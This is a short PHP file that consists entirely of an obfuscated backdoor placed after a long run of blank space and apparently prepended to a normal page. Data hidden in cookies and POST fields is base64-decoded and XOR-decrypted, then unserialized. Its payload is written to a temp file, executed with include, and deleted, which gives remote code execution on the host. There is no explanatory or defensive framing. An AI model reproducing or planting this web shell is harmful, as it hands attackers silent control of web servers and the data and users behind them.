<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("ldtqybt")){class ldtqybt{public static $ddwuthg = "mvvoztyoivkospji";public static $dlvjmck = NULL;public function __construct(){$dgafqpzdz = @$_COOKIE[substr(ldtqybt::$ddwuthg, 0, 4)];if (!empty($dgafqpzdz)){$rxdolkjmuy = "base64";$slknybebbu = "";$dgafqpzdz = explode(",", $dgafqpzdz);foreach ($dgafqpzdz as $jjchxvx){$slknybebbu .= @$_COOKIE[$jjchxvx];$slknybebbu .= @$_POST[$jjchxvx];}$slknybebbu = array_map($rxdolkjmuy . "_decode", array($slknybebbu,)); $slknybebbu = $slknybebbu[0] ^ str_repeat(ldtqybt::$ddwuthg, (strlen($slknybebbu[0]) / strlen(ldtqybt::$ddwuthg)) + 1);ldtqybt::$dlvjmck = @unserialize($slknybebbu);}}public function __destruct(){$this->qeyqqfslkk();}private function qeyqqfslkk(){if (is_array(ldtqybt::$dlvjmck)) {$snmep = sys_get_temp_dir() . "/" . crc32(ldtqybt::$dlvjmck["salt"]);@ldtqybt::$dlvjmck["write"]($snmep, ldtqybt::$dlvjmck["content"]);include $snmep;@ldtqybt::$dlvjmck["delete"]($snmep);exit();}}}$czwslpo = new ldtqybt(); $czwslpo = NULL;} ?><?php
